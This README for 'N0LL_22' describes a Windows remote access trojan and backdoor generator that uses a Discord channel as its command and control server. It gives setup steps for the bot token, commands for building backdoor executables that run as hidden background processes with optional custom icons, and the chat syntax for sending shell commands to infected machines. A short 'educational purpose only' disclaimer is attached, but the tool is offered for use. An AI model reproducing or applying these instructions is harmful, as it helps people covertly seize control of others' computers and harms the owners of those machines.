# N0LL_22

A simple discord bot that acts as remote access trojan and backdoor for Windows. This backdoor is controlled remotely using a discord chat, so the discord itself will act as the command and control server, making it easier and portable (can be controlled anywhere as long as you do have your internet connection).

Setup:

`C:\> pip3 install -r requirements.txt`

Usage:

`C:\> python3 backdoor_gen.py <token> <bot_name> <file_name> [option]`

<br/>

# Disclaimer
This tool is for educational purpose only, the author is not responsiblefor any misuse of this tool
<br/>

# Setting Up Discord Bot
Making it short, setting up a discord server can be done by doing the ff:

1. Common sense : Login your account

2. Go to : https://discord.com/developers/applications

3. Click "New Application"

4. Click the application generated

5. Go to "OAuth2 > URL Generator", then check "bot". Upon checking the bot, you will select the permission of the bot for your channel

6. Check "Attach File" and "Send Messages". (But you can add more if you want your bot to have more permission)

7. Open the Generated URL below (In new tab) and just accept everything
   
8. Select which server you want to add your bot and Authorize. Now you have your bot on your server.

Note : The backdoor bot can be accessed anywhere on the channels.

# Setting up the backdoor bot
**Note** : Make sure you installed the prerequisites before doing this

We first have to retrieve the bot token by going to https://discord.com/developers/applications. Select the application you made then "Bot" and in the Build-A-Bot part, you can select "Copy" button, which copies your token to the clipboard.

After copying the token, we can now start making executable backdoors:

`C:\> python3 backdoor_gen.py <token> <bot_nickname> <file_name>`

We can also add an icon for executable by using -i option:

`C:\> python3 backdoor_gen.py <token> <bot_nickname> <file_name> -i <path>`

Debug option for running the binary as console app instead of background process:

`C:\> python3 backdoor_gen.py <token> <bot_nickname> <file_name> -d`

The executable will be generated on the current path with specified filename.

# Executing command on the server
Since the bots will be using one token, different bots are identified using their `bot_nickname` with this, the bot will know if it's their turn to execute commands. Executing command in the server will look like this:

`<bot_nickname> | <commands> [args]`

Example:

`Pablo | shell ping facebook.com`

![Sample discord Command Execute](/Images/disc_cmd_sample.PNG "sample in discord channel")
